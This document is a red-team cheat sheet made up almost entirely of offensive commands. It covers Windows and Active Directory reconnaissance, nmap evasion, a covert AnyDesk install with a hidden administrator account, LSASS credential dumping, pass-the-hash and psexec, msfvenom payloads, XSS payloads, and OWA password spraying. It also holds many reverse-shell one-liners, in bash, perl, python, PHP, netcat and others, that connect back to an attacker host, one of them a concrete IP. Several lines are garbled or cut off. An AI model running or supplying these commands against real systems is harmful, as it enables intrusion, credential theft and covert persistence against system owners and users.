# Red Team and OPSEC - 2023 Edition

> The quieter you become, the more you are able to hear 🥷

## Basic System Info
- `systeminfo`: Show detailed configuration about the computer and OS.
- `hostname`: Display the host name of the current machine.

## Hotfix Information
- `wmic qfe get Caption,Description,HotFixID,InstalledOn`: List patches and hotfixes installed on the system.

## User & Group Information
- `net users`: List all user accounts.
- `net localgroups`: List all local groups.
- `net user hacker`: Show information about the user named "hacker".
- `net group /domain`: List all domain groups.

## Network Details
- `ipconfig /all`: Show detailed IP configuration.
- `route print`: Display routing table.
- `arp -A`: Show ARP cache.

## Privilege Information
- `whoami /priv`: Display user privileges.

## Data Search
- `findstr /spin "password" *.*`: Recursively search for the term "password" in files.

## Process & Service Details
- `tasklist /SVC`: List running processes with service details.
- `sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul`: Identify unquoted service paths which can be exploited for privilege escalation.

## Network Connections
- `netstat -ano`: List network connections, ports, and associated process IDs.

## Directory Access
- `dir /a-r-d /s /b`: Search for writeable directories.

## Domain & Forest Info (PowerShell)
- `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`: Get current domain details.
- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`: List trust relationships of current domain.
- `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()`: Get current forest details.
- `([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()`: List trust relationships of a specific forest.

## Domain Controller and Trusts
- `nltest /dclist:offense.local`: List all Domain Controllers in the specified domain.
- `net group "domain controllers" /domain`: Display domain controllers in the domain.
- `nltest /dsgetdc:offense.local`: Get Domain Controller details for a domain.
- `nltest /domain_trusts`: List all domain trusts.
- `nltest /user:"spotless"`: Fetch details for a specific user.

## Authentication & Session Details
- `set l`: Display local environment variables.
- `klist`: Display Kerberos tickets.
- `klist sessions`: Display all logon sessions, including NTLM.
- `klist tgt`: Display cached Kerberos TGT (Ticket Granting Ticket).

## Miscellaneous
- `whoami`: Display logged-in user details (useful on older systems).

## Host Discovery
Discover alive hosts in a network.
- `$ nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24`: Ping scan, no port scan.
- `$ grep “Status: Up” Discovery.gnmap | cut -f 2 -d ‘ ‘ > LiveHosts.txt`: Extract live hosts from the results.

## Top Ports Scan
Identify most commonly used ports.
- `$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt`: TCP SYN scan.
- `$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt`: UDP scan.

## Full Range Port Scan
Full range port scanning; UDP might be slow.
- `$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt`: Common 3674 TCP ports.
- `$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt`: All TCP ports.
- `$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt`: All UDP ports.

## Extract Open Ports
Commands to extract and display open TCP and UDP ports.
- `$ grep “open” FullTCP | cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ | xargs | sed ‘s/ /,/g’ | awk ‘{print “T:”$0}’`
- `$ grep “open” FullUDP | cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ | xargs | sed ‘s/ /,/g’ | awk ‘{print “U:”$0}’`

## Service and OS Detection
Identify services running and OS details.
- `$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt`: Service detection.
- `$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt`: OS detection.
- `$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt`: Combined OS and service detection for specific ports.

## Evasion Techniques
Methods to avoid firewalls or obfuscate scan origin.

### Segmentation
- `$ nmap -f`: Segmented packet scan.

### MTU Manipulation
- `$ nmap --mtu 24`: Change MTU size. It should be a multiple of 8.

### Decoy Scanning
Make it appear the scan is coming from other hosts.
- `$ nmap -D RND:10 [target]`: Randomized decoy scan.
- `$ nmap -D decoy1,decoy2,decoy3 [target]`: Manually specify decoys.

### Zombie Host Scanning
Use idle hosts to mask scan origin.
- `$ nmap -sI [Zombie IP] [Target IP]`: Idle scan using a specific zombie.

### Specified Source Port
- `$ nmap --source-port 80 [target]`: Scan with a specified source port (80 in this case).


## AnyDesk OPSEC Usage
This outlines the usage of AnyDesk, a commercial remote access tool utilized by threat actors for browsing victim host file systems, deploying payloads, and data exfiltration.

**Downloading and Installing AnyDesk:**

1. **Download AnyDesk Executable:**
   - Download the AnyDesk executable using PowerShell.
   - Example PowerShell Script:
     ```powershell
     Invoke-WebRequest -Uri <AnyDesk_Download_URL> -OutFile 'C:\ProgramData\AnyDesk.exe'
     ```

2. **Silent Installation and Password Configuration:**
   - Silently install AnyDesk and set an access password.
   - Commands:
     ```batch
     cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
     cmd.exe /c echo <Your_Password> | C:\ProgramData\AnyDesk.exe --set-password
     ```

**Configuring Additional Administrator Account:**

3. **Create an Additional Administrator Account:**
   - Add an administrator account with a password.
   - Command:
     ```batch
     net user <Username> "<Password>" /add
     ```

4. **Add Account to Administrators Group:**
   - Include the new administrator account in the Administrators group.
   - Command:
     ```batch
     net localgroup Administrators <Username> /ADD
     ```

5. **Hide Account from Login Screen:**
   - Prevent the account from appearing on the login screen.
   - Command:
     ```batch
     reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v <Username> /t REG_DWORD /d 0 /f
     ```

**Gaining Remote Access with AnyDesk:**

6. **Execute AnyDesk with Get-ID Parameter:**
   - Launch AnyDesk with the `--get-id` parameter to enable remote access.
   - Command:
     ```batch
     cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
     ```

#
# Web path scanner
    dirsearch 
    DirBuster
    Patator- password guessing attacks
# Brute force with Patator
    git clone https://github.com/lanjelot/patator.git /usr/share/patator
    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    $ patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’

# Use Fierce to brute DNS
# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.

    # http://ha.ckers.org/fierce/
    $ ./fierce.pl -dns example.com
    $ ./fierce.pl –dns example.com –wordlist myWordList.txt

# Use Nikto to scan Web services

    nikto -C all -h http://IP

    WordPress scan
    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
    ./wpscan –url http://IP/ –enumerate p

# HTTP fingerprint identification

    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
    cd httprint_301/linux/
    ./httprint -h http://IP -s signatures.txt

# Scan with Skipfish
# Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.

    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP

# Use the NC scan

    nc -v -w 1 target -z 1-1000
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

# Unicornscan
# NOTE: Unicornscan is a tool for information gathering and security audits.

    us -H -msf -Iv 192.168.56.101 -p 1-65535
    us -H -mU -Iv 192.168.56.101 -p 1-65535

# Use Xprobe2 to identify the operating system fingerprint

    xprobe2 -v -p tcp:80:open IP
    Enumeration of Samba

    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U “” target
    enum4linux target

# Enumerates SNMP

    snmpget -v 1 -c public IP
    snmpwalk -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

# Useful Windows cmd command

    net localgroup Users
    net localgroup Administrators
    search dir/s *.doc
    system(“start cmd.exe /k $cmd”)
    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64

# PuTTY connects the tunnel

    Forward the remote port to the destination address
    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP

# Meterpreter port forwarding

    https://www.offensive-security.com/metasploit-unleashed/portfwd/
# Forward the remote port to the destination address
    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
    kali > rdesktop 127.0.0.1:3389

# Enable the RDP service

    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

# Close Windows Firewall
    netsh firewall set opmode disable

Meterpreter VNC/RDP

    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
    run getgui -u admin -p 1234
    run vnc -p 5043

# Use Mimikatz

    Gets the Windows plaintext user name password

    git clone https://github.com/gentilkiwi/mimikatz.git
    privilege::debug
    sekurlsa::logonPasswords full

Gets a hash value

    git clone https://github.com/byt3bl33d3r/pth-toolkit
    pth-winexe -U hash //IP cmd

    or

    apt-get install freerdp-x11
    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

    or
    
    meterpreter > run post/windows/gather/hashdump
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit
    meterpreter > shell
    
# Use Hashcat to crack passwords    
    hashcat -m 400 -a 0 hash /root/rockyou.txt
    
# Use the NC to fetch Banner information

    nc 192.168.0.10 80
    GET / HTTP/1.1
    Host: 192.168.0.10
    User-Agent: Mozilla/4.0
    Referrer: www.example.com
    <enter>
    <enter>


# Use NC to bounce the shell on Windows

    c:>nc -Lp 31337 -vv -e cmd.exe
    nc 192.168.0.10 31337
    c:>nc example.com 80 -e cmd.exe
    nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000

Look for the SUID/SGID root file

# Locate the SUID root file
find / -user root -perm -4000 -print

# Locate the SGID root file:
find / -group root -perm -2000 -print

# Locate the SUID and SGID files:
find / -perm -4000 -o -perm -2000 -print

# Find files that do not belong to any user:
find / -nouser -print

# Locate a file that does not belong to any user group:
find / -nogroup -print

# Find soft links and point to:
find / -type l -ls

# Python shell

    python -c ‘import pty;pty.spawn(“/bin/bash”)’

# Python \ Ruby \ PHP HTTP server

    python2 -m SimpleHTTPServer
    python3 -m http.server
    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, 😀
    ocumentRoot => Dir.pwd).start”
    php -S 0.0.0.0:8888

# Gets the PID corresponding to the process

    fuser -nv tcp 80
    fuser -k -n tcp 80

# Use Hydra to crack RDP

    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp

# Mount the remote Windows shared folder

    smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

# Under Kali compile Exploit

    gcc -m32 -o output32 hello.c
    gcc -m64 -o output hello.c

# Compile Windows Exploit under Kali

    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
    wine mingw-get-setup.exe
    select mingw32-base
    cd /root/.wine/drive_c/windows
    wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
    cd /root/.wine/drive_c/MinGW/bin
    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
    wine ability.exe

# NASM command

    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.

    nasm -f bin -o payload.bin payload.asm
    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

# SSH penetration

    ssh -D 127.0.0.1:1080 -p 22 user@IP
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains commands target
    SSH penetrates from one network to another
    
    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    proxychains commands target

# Use metasploit for penetration

 

# https://www.offensive-security.com/metasploit-unleashed/pivoting/
    meterpreter > ipconfig
    IP Address : 10.1.13.3
    meterpreter > run autoroute -s 10.1.13.0/24
    meterpreter > run autoroute -p
    10.1.13.0 255.255.255.0 Session 1
    meterpreter > Ctrl+Z
    msf auxiliary(tcp) > use exploit/windows/smb/psexec
    msf exploit(psexec) > set RHOST 10.1.13.2
    msf exploit(psexec) > exploit
    meterpreter > ipconfig
    IP Address : 10.1.13.2

# Exploit-DB based on CSV file

    git clone https://github.com/offensive-security/exploit-database.git
    cd exploit-database
    ./searchsploit –u
    ./searchsploit apache 2.2
    ./searchsploit “Linux Kernel”

    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3

# MSF Payloads

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c

# MSF generates the Meterpreter Shell that bounces under Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell

# MSF build bounce Shell (C Shellcode)
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c

# MSF generates a bounce Python Shell
    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py

# MSF builds rebound ASP Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp

# MSF generates bounce shells
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

# MSF build bounces PHP Shell
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    add <?php at the beginning
    perl -i~ -0777pe’s/^/<?php \n/’ shell.php

# MSF generates bounce Win Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe

# Linux commonly used security commands

    find / -uid 0 -perm -4000

    find / -perm -o=w

    find / -name ” ” -print
    find / -name “..” -print
    find / -name “. ” -print
    find / -name ” ” -print

    find / -nouser

    lsof +L1

    lsof -i

    arp -a

    getent passwd

    getent group

    for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

    cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

    find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
    chattr -i file

# Windows Buffer Overflow exploits 

    msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c

# COMMONLY USED BAD CHARACTERS:

    \x00\x0a\x0d\x20 For http request
    \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)

# Regular command:
    pattern create
    pattern offset (EIP Address)
    pattern offset (ESP Address)
    add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

    !pvefindaddr pattern_create 5000
    !pvefindaddr suggest
    !pvefindaddr nosafeseh


    !mona config -set workingfolder C:\Mona\%p

    !mona config -get workingfolder
    !mona mod
    !mona bytearray -b “\x00\x0a”
    !mona pc 5000
    !mona po EIP
    !mona suggest

# SEH – Structured exception handling

Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.

    # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
    # http://baike.baidu.com/view/243131.htm
    !mona suggest
    !mona nosafeseh
    nseh=”\xeb\x06\x90\x90″ (next seh chain)
    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)

# ROP (DEP)

Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.

DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.

    # https://en.wikipedia.org/wiki/Return-oriented_programming
    # https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
    # https://en.wikipedia.org/wiki/Data_Execution_Prevention
    # http://baike.baidu.com/item/DEP/7694630
    !mona modules
    !mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
    !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)

# ASLR – Address space format randomization
    # https://en.wikipedia.org/wiki/Address_space_layout_randomization
    !mona noaslr 
# EGG Hunter technology

Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.

    # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
    # http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
    # http://www.fuzzysecurity.com/tutorials/expDev/4.html
    !mona jmp -r esp
    !mona egg -t lxxl
    \xeb\xc4 (jump backward -60)
    buff=lxxllxxl+shell
    !mona egg -t ‘w00t’

# GDB Debugger commonly used commands

    break *_start
    next
    step
    n
    s
    continue
    c

# Data
    checking ‘REGISTERS’ and ‘MEMORY’

# Display the register values: (Decimal,Binary,Hex)
    print /d –> Decimal
    print /t –> Binary
    print /x –> Hex
    O/P :
    (gdb) print /d $eax
    $17 = 13
    (gdb) print /t $eax
    $18 = 1101
    (gdb) print /x $eax
    $19 = 0xd
    (gdb)

# Display the value of a specific memory address
    command : x/nyz (Examine)
    n –> Number of fields to display ==>
    y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
    z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)

# BASH rebound Shell

    bash -i >& /dev/tcp/X.X.X.X/443 0>&1

    exec /bin/bash 0&0 2>&0
    exec /bin/bash 0&0 2>&0

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/attackerip/4444

    cat <&5 | while read line; do $line 2>&5 >&5; done # or:
    while read line 0<&5; do $line 2>&5 >&5; done

    /bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
    /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

# PERL rebound Shell

    perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

# Win platform
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# RUBY rebound Shell

    ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

# Win platform
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

# PYTHON rebound Shell

    python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

# PHP bounce Shell

    php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

# JAVA rebound Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
    p.waitFor()

# NETCAT rebound Shell

    nc -e /bin/sh attackerip 4444
    nc -e /bin/sh 192.168.37.10 443

# If the -e parameter is disabled, you can try the following command
    # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
    /bin/sh | nc attackerip 443
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you installed the wrong version of netcat, try the following command
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

    TELNET rebound Shell

# If netcat is not available
    mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

    XTERM rebound Shell

# Enable the X server (: 1 – listen on TCP port 6001)

    apt-get install xnest
    Xnest :1

# Remember to authorize the connection from the target IP
    xterm -display 127.0.0.1:1
# Grant access
    xhost +targetip

# Connect back to our X server on the target machine
    xterm -display attackerip:1
    /usr/openwin/bin/xterm -display attackerip:1
    or
    $ DISPLAY=attackerip:0 xterm

# XSS

    # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    (“< iframes > src=http://IP:PORT </ iframes >”)

    <script>document.location=http://IP:PORT</script>

    ‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    “;!–”<XSS>=&amp;amp;{()}

    <IMG SRC=”javascript:alert(‘XSS’);”>
    <IMG SRC=javascript:alert(‘XSS’)>
    <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>””>
    <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

    <IMG                     SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
    <IMG SRC=”jav ascript:alert(‘XSS’);”>

    perl -e ‘print “<IMG SRC=javascript:alert(\”XSS\”)>”;’ > out

    <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

    (“>< iframes http://google.com < iframes >)

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>
    “><script >alert(document.cookie)</script>
    %253cscript%253ealert(document.cookie)%253c/script%253e
    “><s”%2b”cript>alert(document.cookie)</script>
    %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
    <img src=asdf onerror=alert(document.cookie)>

    SSH Over SCTP (using Socat)

    $ socat SCTP-LISTEN:80,fork TCP:localhost:22
    $ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
    $ ssh -lusername localhost -D 8080 -p 1337

# Metagoofil – Metadata collection tool

    Note: Metagoofil is a tool for collecting information using Google.
    $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html

# Use a DNS tunnel to bypass the firewall

    $ apt-get update
    $ apt-get -y install ruby-dev git make g++
    $ gem install bundler
    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/server
    $ bundle install
    $ ruby ./dnscat2.rb
    dnscat2> New session established: 16059
    dnscat2> session -i 16059






# Red-Team and Infrastructure Assessments

### External recon

https://github.com/dcsync/recontools

### O365 bruting

`python3 office365userenum.py -u test.txt -v -o output.txt --password 'Password1`

Enumeration (opsec safe):

`python o365creeper.py -f test.txt`

https://github.com/0xZDH/o365spray

### subdomain finder

https://spyse.com/

### Cert search
https://crt.sh
`%.blah.com`
### search categorized expired domain
`python3 ./domainhunter.py -r 1000`

### Metadata
`PS C:\> Invoke-PowerMeta -TargetDomain targetdomain.com`

## Domain User Enumeration

### MailSniper

#### Usernameharvest
`Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt`
#### Domainnameharvest
`Invoke-DomainHarvestOWA -ExchHostname mail.domain.com` 
#### OWA Spray
`Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt`

### Grab employee names from Linkedin

`theharvester -d blah.com -l 1000 -b linkedin`

https://github.com/m8r0wn/CrossLinked

### Extract Linkedin details from snov.io

Regex to extract emails

`grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`

### Extract from burp 

`cat linkedin.txt | tr , '\n' | sed 's/\”//g' | awk '/"title":{"textDirection":"FIRST_STRONG"/{getline; print}'`

### Change format to b.lah

`awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'`

`awk '{print $0,tolower(substr($1,1,1)$NF)}' names.txt`

### Check usernames against AD:

Handy if you have generated a list from linkedin or a list of usernames.

`nmap -p 88 1.1.1.1 --script krb5-enum-users --script-args krb5-enum-users.realm="DOMAIN"`

username list is located at `/usr/local/share/nmap/nselib/data/usernames.lst` in Kali

### Null sessions

Still works on infra that was upgraded from 2k, 2k3.

`net use \\IP_ADDRESS\ipc$ "" /user:""`

Use enum4linux, enum or Dumpsec following the null session setup.

### GPP 

https://bitbucket.org/grimhacker/gpppfinder/src/master/

`findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml`

## situational awareness

https://github.com/dafthack/HostRecon

Privesc checks:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

## Network Attacks 

### Responder

Grab NetNTLM hashes off the network

#### Without wpad:

`responder -I eth0`

#### With wpad:

`responder -I eth0 --wpad -b -f -F`

#### Filter logs from logs folder and remove machine accounts:

`sort -m *.txt | uniq -d | awk '!/\$/'`

#### Cracking with John:

`john SMB-NTLMv2-Client-172.20.22.217.txt --wordlist=/root/passwords.txt`

Use hashcat on a more powerful box. This is only for easy wins.

#### NTLM Relaying 

`ntlmrelayx.py -tf targets.txt -c <insert Empire Powershell launcher>`
  
### MITM6

`python mitm6.py -d blah.local`

#### Capture hashes

`impacket-smbserver hiya /tmp/ -smb2support`

## Bruteforce domain passwords
### Common Passwords

$Company1
$Season$Year
Password1
Password!
Welcome1
Welcome!
Welcome@123
P@55word
P@55w0rd
$month$year

### Using hydra

